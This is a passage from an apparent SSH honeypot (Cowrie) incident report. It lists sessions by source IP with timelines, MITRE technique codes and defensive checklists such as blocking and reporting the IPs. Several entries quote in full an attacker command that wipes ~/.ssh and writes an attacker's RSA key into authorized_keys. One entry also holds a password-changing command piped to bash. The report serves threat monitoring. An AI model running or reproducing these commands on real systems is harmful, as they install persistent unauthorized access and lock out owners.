| `2026-09-27 14:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.19[.]37` to AbuseIPDB if not already reported
- [ ] Block `42.96.19[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e85e29a976b1

| Field | Detail |
|---|---|
| **Source IP** | `202.63.242[.]138` |
| **First Seen** | 2026-09-27 14:59 |
| **Last Seen** | 2026-09-27 15:00 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:59:45` | `cowrie.session.connect` |
| `2026-09-27 14:59:45` | `cowrie.client.version` |
| `2026-09-27 14:59:47` | `cowrie.client.kex` |
| `2026-09-27 14:59:50` | `cowrie.login.success` |
| `2026-09-27 14:59:51` | `cowrie.session.params` |
| `2026-09-27 14:59:51` | `cowrie.command.input` |
| `2026-09-27 14:59:51` | `cowrie.command.failed` |
| `2026-09-27 14:59:52` | `cowrie.log.closed` |
| `2026-09-27 14:59:53` | `cowrie.session.params` |
| `2026-09-27 14:59:53` | `cowrie.command.input` |
| `2026-09-27 14:59:54` | `cowrie.session.file_download` |
| `2026-09-27 14:59:54` | `cowrie.log.closed` |
| `2026-09-27 15:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.63.242[.]138` to AbuseIPDB if not already reported
- [ ] Block `202.63.242[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3b0c9a01b47

| Field | Detail |
|---|---|
| **Source IP** | `202.63.242[.]138` |
| **First Seen** | 2026-09-27 14:59 |
| **Last Seen** | 2026-09-27 14:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:59:55` | `cowrie.session.connect` |
| `2026-09-27 14:59:55` | `cowrie.client.version` |
| `2026-09-27 14:59:55` | `cowrie.client.kex` |
| `2026-09-27 14:59:58` | `cowrie.login.success` |
| `2026-09-27 14:59:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.63.242[.]138` to AbuseIPDB if not already reported
- [ ] Block `202.63.242[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-114c94ea48ba

| Field | Detail |
|---|---|
| **Source IP** | `202.63.242[.]138` |
| **First Seen** | 2026-09-27 14:59 |
| **Last Seen** | 2026-09-27 15:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:59:59` | `cowrie.session.connect` |
| `2026-09-27 14:59:59` | `cowrie.client.version` |
| `2026-09-27 15:00:00` | `cowrie.client.kex` |
| `2026-09-27 15:00:03` | `cowrie.login.success` |
| `2026-09-27 15:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.63.242[.]138` to AbuseIPDB if not already reported
- [ ] Block `202.63.242[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9422ef7369ba

| Field | Detail |
|---|---|
| **Source IP** | `38.132.122[.]177` |
| **First Seen** | 2026-09-27 15:26 |
| **Last Seen** | 2026-09-27 15:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:26:22` | `cowrie.session.connect` |
| `2026-09-27 15:26:22` | `cowrie.client.version` |
| `2026-09-27 15:26:22` | `cowrie.client.kex` |
| `2026-09-27 15:26:22` | `cowrie.login.success` |
| `2026-09-27 15:26:23` | `cowrie.session.params` |
| `2026-09-27 15:26:23` | `cowrie.command.input` |
| `2026-09-27 15:26:23` | `cowrie.command.failed` |
| `2026-09-27 15:26:23` | `cowrie.log.closed` |
| `2026-09-27 15:26:24` | `cowrie.session.params` |
| `2026-09-27 15:26:24` | `cowrie.command.input` |
| `2026-09-27 15:26:24` | `cowrie.session.file_download` |
| `2026-09-27 15:26:24` | `cowrie.log.closed` |
| `2026-09-27 15:26:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.132.122[.]177` to AbuseIPDB if not already reported
- [ ] Block `38.132.122[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-205b85e0c1a2

| Field | Detail |
|---|---|
| **Source IP** | `38.132.122[.]177` |
| **First Seen** | 2026-09-27 15:26 |
| **Last Seen** | 2026-09-27 15:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:26:24` | `cowrie.session.connect` |
| `2026-09-27 15:26:24` | `cowrie.client.version` |
| `2026-09-27 15:26:24` | `cowrie.client.kex` |
| `2026-09-27 15:26:24` | `cowrie.login.success` |
| `2026-09-27 15:26:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.132.122[.]177` to AbuseIPDB if not already reported
- [ ] Block `38.132.122[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88466c833c8e

| Field | Detail |
|---|---|
| **Source IP** | `38.132.122[.]177` |
| **First Seen** | 2026-09-27 15:26 |
| **Last Seen** | 2026-09-27 15:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:26:24` | `cowrie.session.connect` |
| `2026-09-27 15:26:24` | `cowrie.client.version` |
| `2026-09-27 15:26:24` | `cowrie.client.kex` |
| `2026-09-27 15:26:24` | `cowrie.login.success` |
| `2026-09-27 15:26:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.132.122[.]177` to AbuseIPDB if not already reported
- [ ] Block `38.132.122[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-044ab5d9901a

| Field | Detail |
|---|---|
| **Source IP** | `191.96.110[.]97` |
| **First Seen** | 2026-09-27 15:38 |
| **Last Seen** | 2026-09-27 15:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:38:43` | `cowrie.session.connect` |
| `2026-09-27 15:38:43` | `cowrie.client.version` |
| `2026-09-27 15:38:43` | `cowrie.client.kex` |
| `2026-09-27 15:38:43` | `cowrie.login.success` |
| `2026-09-27 15:38:44` | `cowrie.session.params` |
| `2026-09-27 15:38:44` | `cowrie.command.input` |
| `2026-09-27 15:38:44` | `cowrie.command.failed` |
| `2026-09-27 15:38:44` | `cowrie.log.closed` |
| `2026-09-27 15:38:45` | `cowrie.session.params` |
| `2026-09-27 15:38:45` | `cowrie.command.input` |
| `2026-09-27 15:38:45` | `cowrie.session.file_download` |
| `2026-09-27 15:38:45` | `cowrie.log.closed` |
| `2026-09-27 15:38:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.96.110[.]97` to AbuseIPDB if not already reported
- [ ] Block `191.96.110[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39bbaf42b895

| Field | Detail |
|---|---|
| **Source IP** | `191.96.110[.]97` |
| **First Seen** | 2026-09-27 15:38 |
| **Last Seen** | 2026-09-27 15:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:38:45` | `cowrie.session.connect` |
| `2026-09-27 15:38:45` | `cowrie.client.version` |
| `2026-09-27 15:38:45` | `cowrie.client.kex` |
| `2026-09-27 15:38:46` | `cowrie.login.success` |
| `2026-09-27 15:38:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.96.110[.]97` to AbuseIPDB if not already reported
- [ ] Block `191.96.110[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b6303db45c0

| Field | Detail |
|---|---|
| **Source IP** | `191.96.110[.]97` |
| **First Seen** | 2026-09-27 15:38 |
| **Last Seen** | 2026-09-27 15:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:38:46` | `cowrie.session.connect` |
| `2026-09-27 15:38:46` | `cowrie.client.version` |
| `2026-09-27 15:38:46` | `cowrie.client.kex` |
| `2026-09-27 15:38:46` | `cowrie.login.success` |
| `2026-09-27 15:38:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.96.110[.]97` to AbuseIPDB if not already reported
- [ ] Block `191.96.110[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bdd79741303

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-09-27 15:39 |
| **Last Seen** | 2026-09-27 15:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:39:05` | `cowrie.session.connect` |
| `2026-09-27 15:39:05` | `cowrie.client.version` |
| `2026-09-27 15:39:05` | `cowrie.client.kex` |
| `2026-09-27 15:39:06` | `cowrie.login.success` |
| `2026-09-27 15:39:06` | `cowrie.session.params` |
| `2026-09-27 15:39:06` | `cowrie.command.input` |
| `2026-09-27 15:39:06` | `cowrie.command.failed` |
| `2026-09-27 15:39:06` | `cowrie.log.closed` |
| `2026-09-27 15:39:07` | `cowrie.session.params` |
| `2026-09-27 15:39:07` | `cowrie.command.input` |
| `2026-09-27 15:39:07` | `cowrie.session.file_download` |
| `2026-09-27 15:39:07` | `cowrie.log.closed` |
| `2026-09-27 15:39:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b910972bbee

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-09-27 15:39 |
| **Last Seen** | 2026-09-27 15:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:39:07` | `cowrie.session.connect` |
| `2026-09-27 15:39:07` | `cowrie.client.version` |
| `2026-09-27 15:39:07` | `cowrie.client.kex` |
| `2026-09-27 15:39:08` | `cowrie.login.success` |
| `2026-09-27 15:39:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34e265c73ba7

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-09-27 15:39 |
| **Last Seen** | 2026-09-27 15:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:39:08` | `cowrie.session.connect` |
| `2026-09-27 15:39:08` | `cowrie.client.version` |
| `2026-09-27 15:39:08` | `cowrie.client.kex` |
| `2026-09-27 15:39:08` | `cowrie.login.success` |
| `2026-09-27 15:39:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc99bb97ba0a

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]88` |
| **First Seen** | 2026-09-27 15:43 |
| **Last Seen** | 2026-09-27 15:44 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:43:39` | `cowrie.session.connect` |
| `2026-09-27 15:43:41` | `cowrie.client.version` |
| `2026-09-27 15:43:41` | `cowrie.client.kex` |
| `2026-09-27 15:43:42` | `cowrie.login.success` |
| `2026-09-27 15:43:43` | `cowrie.session.params` |
| `2026-09-27 15:43:43` | `cowrie.command.input` |
| `2026-09-27 15:43:43` | `cowrie.command.failed` |
| `2026-09-27 15:43:43` | `cowrie.log.closed` |
| `2026-09-27 15:43:44` | `cowrie.session.params` |
| `2026-09-27 15:43:44` | `cowrie.command.input` |
| `2026-09-27 15:43:45` | `cowrie.session.file_download` |
| `2026-09-27 15:43:45` | `cowrie.log.closed` |
| `2026-09-27 15:44:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]88` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-285fc087eb70

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]88` |
| **First Seen** | 2026-09-27 15:43 |
| **Last Seen** | 2026-09-27 15:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:43:45` | `cowrie.session.connect` |
| `2026-09-27 15:43:45` | `cowrie.client.version` |
| `2026-09-27 15:43:45` | `cowrie.client.kex` |
| `2026-09-27 15:43:48` | `cowrie.login.success` |
| `2026-09-27 15:43:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]88` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d71d65831b8b

| Field | Detail |
|---|---|
| **Source IP** | `117.2.49[.]125` |
| **First Seen** | 2026-09-27 15:44 |
| **Last Seen** | 2026-09-27 15:45 |
| **Session Duration** | 61s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "1qazXSW@\nazANC7qE7KJQ\nazANC7qE7KJQ"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:44:55` | `cowrie.session.connect` |
| `2026-09-27 15:44:55` | `cowrie.client.version` |
| `2026-09-27 15:44:55` | `cowrie.client.kex` |
| `2026-09-27 15:44:58` | `cowrie.login.success` |
| `2026-09-27 15:45:01` | `cowrie.session.params` |
| `2026-09-27 15:45:01` | `cowrie.command.input` |
| `2026-09-27 15:45:01` | `cowrie.command.failed` |
| `2026-09-27 15:45:01` | `cowrie.log.closed` |
| `2026-09-27 15:45:02` | `cowrie.session.params` |
| `2026-09-27 15:45:02` | `cowrie.command.input` |
| `2026-09-27 15:45:03` | `cowrie.session.file_download` |
| `2026-09-27 15:45:03` | `cowrie.log.closed` |
| `2026-09-27 15:45:32` | `cowrie.session.params` |
| `2026-09-27 15:45:32` | `cowrie.command.input` |
| `2026-09-27 15:45:32` | `cowrie.log.closed` |
| `2026-09-27 15:45:33` | `cowrie.session.params` |
| `2026-09-27 15:45:33` | `cowrie.command.input` |
| `2026-09-27 15:45:33` | `cowrie.command.input` |
| `2026-09-27 15:45:33` | `cowrie.command.failed` |
| `2026-09-27 15:45:34` | `cowrie.log.closed` |
| `2026-09-27 15:45:35` | `cowrie.session.params` |
| `2026-09-27 15:45:35` | `cowrie.command.input` |
| `2026-09-27 15:45:36` | `cowrie.log.closed` |
| `2026-09-27 15:45:37` | `cowrie.session.params` |
| `2026-09-27 15:45:37` | `cowrie.command.input` |
| `2026-09-27 15:45:37` | `cowrie.log.closed` |
| `2026-09-27 15:45:38` | `cowrie.session.params` |
| `2026-09-27 15:45:38` | `cowrie.command.input` |
| `2026-09-27 15:45:39` | `cowrie.log.closed` |
| `2026-09-27 15:45:40` | `cowrie.session.params` |
| `2026-09-27 15:45:40` | `cowrie.command.input` |
| `2026-09-27 15:45:40` | `cowrie.command.input` |
| `2026-09-27 15:45:40` | `cowrie.log.closed` |
| `2026-09-27 15:45:41` | `cowrie.session.params` |
| `2026-09-27 15:45:41` | `cowrie.command.input` |
| `2026-09-27 15:45:42` | `cowrie.log.closed` |
| `2026-09-27 15:45:43` | `cowrie.session.params` |
| `2026-09-27 15:45:43` | `cowrie.command.input` |
| `2026-09-27 15:45:44` | `cowrie.log.closed` |
| `2026-09-27 15:45:44` | `cowrie.session.params` |
| `2026-09-27 15:45:44` | `cowrie.command.input` |
| `2026-09-27 15:45:45` | `cowrie.log.closed` |
| `2026-09-27 15:45:46` | `cowrie.session.params` |
| `2026-09-27 15:45:46` | `cowrie.command.input` |
| `2026-09-27 15:45:47` | `cowrie.log.closed` |
| `2026-09-27 15:45:48` | `cowrie.session.params` |
| `2026-09-27 15:45:48` | `cowrie.command.input` |
| `2026-09-27 15:45:48` | `cowrie.log.closed` |
| `2026-09-27 15:45:49` | `cowrie.session.params` |
| `2026-09-27 15:45:49` | `cowrie.command.input` |
| `2026-09-27 15:45:50` | `cowrie.log.closed` |
| `2026-09-27 15:45:51` | `cowrie.session.params` |
| `2026-09-27 15:45:51` | `cowrie.command.input` |
| `2026-09-27 15:45:51` | `cowrie.log.closed` |
| `2026-09-27 15:45:52` | `cowrie.session.params` |
| `2026-09-27 15:45:52` | `cowrie.command.input` |
| `2026-09-27 15:45:53` | `cowrie.log.closed` |
| `2026-09-27 15:45:54` | `cowrie.session.params` |
| `2026-09-27 15:45:54` | `cowrie.command.input` |
| `2026-09-27 15:45:55` | `cowrie.log.closed` |
| `2026-09-27 15:45:56` | `cowrie.session.params` |
| `2026-09-27 15:45:56` | `cowrie.command.input` |
| `2026-09-27 15:45:56` | `cowrie.log.closed` |
| `2026-09-27 15:45:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.2.49[.]125` to AbuseIPDB if not already reported
- [ ] Block `117.2.49[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d74a9b3b204

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-09-27 15:55 |
| **Last Seen** | 2026-09-27 15:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:55:37` | `cowrie.session.connect` |
| `2026-09-27 15:55:37` | `cowrie.client.version` |
| `2026-09-27 15:55:37` | `cowrie.client.kex` |
| `2026-09-27 15:55:38` | `cowrie.login.success` |
| `2026-09-27 15:55:39` | `cowrie.session.params` |
| `2026-09-27 15:55:39` | `cowrie.command.input` |
| `2026-09-27 15:55:39` | `cowrie.command.failed` |
| `2026-09-27 15:55:40` | `cowrie.log.closed` |
| `2026-09-27 15:55:41` | `cowrie.session.params` |
| `2026-09-27 15:55:41` | `cowrie.command.input` |
| `2026-09-27 15:55:41` | `cowrie.session.file_download` |
| `2026-09-27 15:55:41` | `cowrie.log.closed` |
| `2026-09-27 15:55:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a81a4da09f21

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-09-27 15:55 |
| **Last Seen** | 2026-09-27 15:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
